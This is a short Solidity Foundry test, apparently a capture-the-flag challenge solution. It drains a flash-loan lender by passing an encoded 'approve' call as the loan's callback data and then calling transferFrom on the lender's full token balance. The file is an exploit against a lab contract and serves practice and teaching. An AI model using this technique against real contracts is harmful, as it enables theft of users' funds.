// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {BadCallerBaseTest} from "./BadCallerBase.t.sol";

contract BadCallerTest is BadCallerBaseTest {
    function testExploit() external validation {
        // TODO
        uint256 assets = token.balanceOf(address(lender));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), assets);
        lender.flashLoan(address(token), 0, data);
        token.transferFrom(address(lender), address(this), assets);
    }
}
